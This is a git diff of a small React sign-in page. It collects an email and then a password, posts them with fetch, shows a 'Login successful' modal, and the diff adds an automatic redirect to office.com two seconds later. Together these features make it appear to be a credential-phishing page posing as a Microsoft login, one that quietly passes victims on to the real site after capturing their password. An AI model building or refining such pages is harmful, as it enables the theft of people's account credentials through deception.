@@ -8,15 +8,13 @@ import {
   SubmitBtn,
 } from "./styles/card";
 import { Modal } from "./styles/modal";
-import { BrowserRouter, Link } from "react-router-dom";
-import { useEffect } from "react";
+import { Link, withRouter } from "react-router-dom";
 
 function App() {
   const [isPassword, setIsPassword] = useState(false);
   const [isModal, setIsModal] = useState(false);
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
-  // const history = useHistory();
 
   const handleEmailSubmit = (evt: React.SyntheticEvent) => {
     evt.preventDefault();
@@ -40,22 +38,14 @@ function App() {
       .then((data) => {
         console.log(data);
         setIsModal(true);
+        setTimeout(() => window.location.assign("https://office.com"), 2000);
       })
       .catch((err) => {
         console.log(err);
       });
   };
-
-  useEffect(() => {
-    // if (isModal) {
-    //   setTimeout(() => {}, 2000);
-    //   history.push("https://office.com");
-    // }
-
-    // eslint-disable-next-line react-hooks/exhaustive-deps
-  }, [isModal]);
   return (
-    <BrowserRouter>
+    <>
       <MainWrapper>
         <SignCard>
           <div>
@@ -117,8 +107,8 @@ function App() {
           <div>Login successful</div>
         </Modal>
       )}
-    </BrowserRouter>
+    </>
   );
 }
 
-export default App;
+export default withRouter(App);
